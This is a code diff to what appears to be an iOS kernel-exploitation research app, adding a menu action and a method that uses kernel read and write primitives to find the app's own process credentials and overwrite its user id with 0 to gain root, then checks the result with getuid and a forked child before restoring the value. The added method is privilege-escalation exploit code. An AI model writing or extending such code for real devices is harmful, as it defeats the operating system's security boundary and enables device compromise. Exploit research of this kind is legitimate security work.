@@ -440,6 +440,11 @@
                                             handler:^(UIAlertAction *a) {
         [weakSelf runGlyphAgxDeputy];
     }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"Direct uid write (DART path)"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runDirectUidWrite];
+    }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"ucred heap swap (E9)"
                                               style:UIAlertActionStyleDefault
                                             handler:^(UIAlertAction *a) {
@@ -517,6 +522,68 @@
     }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
     [self presentViewController:sheet animated:YES completion:nil];
+}
+
+- (void)runDirectUidWrite {
+    if (![self beginJob]) return;
+    self.statusLabel.text = @"Direct uid write…";
+    [[KPLog shared] append:@"[RESULT] Direct uid write — запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSMutableString *r = [NSMutableString string];
+        [r appendString:@"\n=== Direct uid write to ucred+0x18 ===\n"];
+        extern uint64_t early_kread64(uint64_t where);
+        extern void early_kwrite64(uint64_t where, uint64_t what);
+        extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
+        extern uint32_t off_proc_p_proc_ro;
+        extern uint32_t off_proc_ro_p_ucred;
+
+        uint64_t proc = kp_find_self_proc_by_pid(getpid());
+        if (!proc) { [r appendString:@"  proc not found\n"]; goto done; }
+        uint64_t procRo = early_kread64(proc + off_proc_p_proc_ro);
+        uint64_t ucred = early_kread64(procRo + off_proc_ro_p_ucred);
+        [r appendFormat:@"  ucred = 0x%016llx\n", ucred];
+
+        // Read current uid at ucred+0x18
+        uint64_t uidBefore = early_kread64(ucred + 0x18);
+        [r appendFormat:@"  ucred+0x18 before: 0x%016llx (uid=%u)\n", uidBefore, (uint32_t)uidBefore];
+
+        // Write uid=0 to ucred+0x18 (cr_uid | cr_ruid)
+        uint64_t uidZero = uidBefore & 0xffffffff00000000ULL;  // zero low 32 bits
+        early_kwrite64(ucred + 0x18, uidZero);
+        uint64_t uidAfter = early_kread64(ucred + 0x18);
+        [r appendFormat:@"  ucred+0x18 after:  0x%016llx (readback)\n", uidAfter];
+
+        // Check getuid
+        uid_t u = getuid();
+        [r appendFormat:@"  getuid() = %d\n", u];
+        if (u == 0) {
+            [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
+        } else {
+            [r appendString:@"  getuid unchanged — TLB cache issue, trying fork\n"];
+            // Fork to get fresh TLB
+            pid_t child = fork();
+            if (child == 0) {
+                // Child process
+                uid_t cu = getuid();
+                exit(cu == 0 ? 0 : 1);
+            } else if (child > 0) {
+                int status = 0;
+                waitpid(child, &status, 0);
+                [r appendFormat:@"  fork child exit=%d (0=root)\n", WEXITSTATUS(status)];
+            }
+            // Restore
+            early_kwrite64(ucred + 0x18, uidBefore);
+        }
+
+    done:
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:r];
+            self.statusLabel.text = [NSString stringWithFormat:@"uid write — uid=%d", (int)getuid()];
+            [self saveExperimentReport:r fileName:@"kexproof-uid-write.txt"];
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
 }
 
 - (void)runGlyphAgxDeputy {
